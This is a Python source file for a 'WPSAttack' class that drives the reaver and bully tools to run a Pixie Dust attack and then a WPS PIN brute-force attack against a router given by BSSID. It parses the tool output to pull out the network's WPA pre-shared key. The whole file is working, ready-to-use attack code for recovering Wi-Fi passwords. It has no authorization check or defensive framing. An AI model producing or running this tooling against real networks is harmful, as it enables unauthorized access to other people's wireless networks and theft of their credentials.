import subprocess
import re
import threading
import time
from typing import Optional, Callable


class WPSAttack:
    """Pixie Dust and PIN brute-force attack against WPS-enabled routers."""

    def __init__(self, iface: str, bssid: str,
                 on_success: Optional[Callable[[str], None]] = None):
        self.iface = iface
        self.bssid = bssid
        self.on_success = on_success
        self.result: Optional[str] = None
        self._stop_event = threading.Event()
        self._thread: Optional[threading.Thread] = None
        self._proc: Optional[subprocess.Popen] = None

    def start(self) -> None:
        self._stop_event.clear()
        self._thread = threading.Thread(target=self._run, daemon=True)
        self._thread.start()

    def stop(self) -> None:
        self._stop_event.set()
        if self._proc:
            try:
                self._proc.terminate()
                self._proc.wait(timeout=5)
            except Exception:
                pass
        if self._thread:
            self._thread.join(timeout=10)

    def wait(self, timeout: int = 120) -> Optional[str]:
        if self._thread:
            self._thread.join(timeout=timeout)
        return self.result

    def _run(self) -> None:
        # Try Pixie Dust first (fast, seconds if vulnerable)
        password = self._pixie_dust()
        if password:
            self.result = password
            if self.on_success:
                self.on_success(password)
            return

        if self._stop_event.is_set():
            return

        # Fall back to PIN brute-force (slow, minutes)
        password = self._pin_attack()
        if password:
            self.result = password
            if self.on_success:
                self.on_success(password)

    def _pixie_dust(self) -> Optional[str]:
        """Pixie Dust attack using reaver -K flag."""
        try:
            self._proc = subprocess.Popen(
                ["reaver", "-i", self.iface, "-b", self.bssid,
                 "-K", "1", "-N", "-q"],
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
            )
            deadline = time.time() + 90
            while time.time() < deadline and not self._stop_event.is_set():
                line = self._proc.stdout.readline() if self._proc.stdout else ""
                if not line:
                    break
                match = re.search(r"WPA PSK\s*[:\']?\s*['\"]?([^\s'\"]+)['\"]?", line)
                if match:
                    return match.group(1)
                if "Failed to associate" in line or "WPS transaction failed" in line:
                    break
            self._proc.terminate()
        except FileNotFoundError:
            # Try bully as alternative
            return self._bully_pixie()
        except Exception:
            pass
        return None

    def _bully_pixie(self) -> Optional[str]:
        """Pixie Dust via bully (alternative to reaver)."""
        try:
            self._proc = subprocess.Popen(
                ["bully", "-b", self.bssid, "-d", "-v", "3", self.iface],
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
            )
            deadline = time.time() + 90
            while time.time() < deadline and not self._stop_event.is_set():
                line = self._proc.stdout.readline() if self._proc.stdout else ""
                if not line:
                    break
                match = re.search(r"WPA PSK\s*=\s*'?([^'\n]+)'?", line)
                if match:
                    return match.group(1).strip()
            self._proc.terminate()
        except Exception:
            pass
        return None

    def _pin_attack(self) -> Optional[str]:
        """Standard WPS PIN brute-force (slow path)."""
        try:
            self._proc = subprocess.Popen(
                ["reaver", "-i", self.iface, "-b", self.bssid,
                 "-N", "-q", "--no-nacks"],
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
            )
            while not self._stop_event.is_set():
                line = self._proc.stdout.readline() if self._proc.stdout else ""
                if not line:
                    break
                match = re.search(r"WPA PSK\s*[:\']?\s*['\"]?([^\s'\"]+)['\"]?", line)
                if match:
                    return match.group(1)
            self._proc.terminate()
        except Exception:
            pass
        return None
